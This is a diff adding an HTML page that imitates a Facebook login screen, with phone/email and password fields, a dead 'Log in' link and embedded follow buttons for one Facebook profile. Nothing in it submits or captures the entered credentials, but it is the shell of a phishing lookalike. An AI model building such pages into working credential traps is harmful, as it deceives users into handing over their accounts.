@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Log in</title>
+    <style>
+        @media only screen and (max-width: 400px) {
+
+        .container{ width: 100% !important;}
+    }
+    </style>
+</head>
+<body style="margin: 0px; padding: 0px;background-color: #f2f2f2;font-family: Verdana, Geneva, Tahoma, sans-serif;overflow: hidden;">
+<div id="fb-root"></div>
+<script async defer crossorigin="anonymous" src="https://connect.facebook.net/bn_IN/sdk.js#xfbml=1&version=v18.0" nonce="abc"></script>
+
+<div style="text-align: center; margin-top: 20px;">
+    <div class="fb-follow" 
+         data-href="https://www.facebook.com/profile.php?id=100081865110232" 
+         data-layout="button" 
+         data-size="large" 
+         data-show-faces="true">
+    </div>
+</div>
+    <table class="container" border="0" cellpadding="0" cellspacing="0" width="400" height="250px" style="margin: 180px auto; font-family: Verdana, Geneva, Tahoma, sans-serif; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden;">
+        <tr>
+            <td style="text-align: center;padding: 40px 20px;">
+                <div style="background-color: #00bbff; display: inline-block;width: 60px; height: 60px; border-radius: 50%; line-height: 60px; font-weight: bold; font-size: 50px;color: #fff; font-family: Arial, Helvetica, sans-serif;">f</div>
+            </td>
+        </tr>
+        <tr style="text-align: center;">
+            <td>
+            <div style="background-color: #00bbff; display: inline-block; color: #fff;padding: 8px 90px; font-weight: 600; border-radius: 8px; margin-bottom: 30px;">
+            Log in your acount
+            </div>
+            </td>
+            <tr>
+                <td style="padding: 10px; text-align: center;">
+                    <input style="width: 250px; height: 30px;padding-left: 10px;border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;" type="text" name="phone_number" id="Email" placeholder="Phone number or Email address">
+                </td>
+            </tr>
+        </tr>
+        <tr>
+            <td style="text-align: center;padding: 10px;">
+                <input style="width: 250px; height: 30px;padding-left: 10px; border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;" type="password" name="password" id="password" placeholder="Password">
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align: center;padding: 10px;padding-bottom: 50px;">
+                <div style="background-color: #00bbff; display: inline-block; color: #fff;padding: 10px 50px; font-weight: 600; border-radius: 20px;font-family: Arial, Helvetica, sans-serif;">
+                    <a href="#" style="color: #fff;text-decoration: none;">Log in</a>
+                </div>
+            </td>
+        </tr>
+    </table>
+
+<div class="fb-follow" 
+     data-href="https://www.facebook.com/profile.php?id=100081865110232" 
+     data-width="400" 
+     data-layout="standard" 
+     data-size="large" 
+     data-show-faces="true">
+</div>
+
+</body>
+</html>
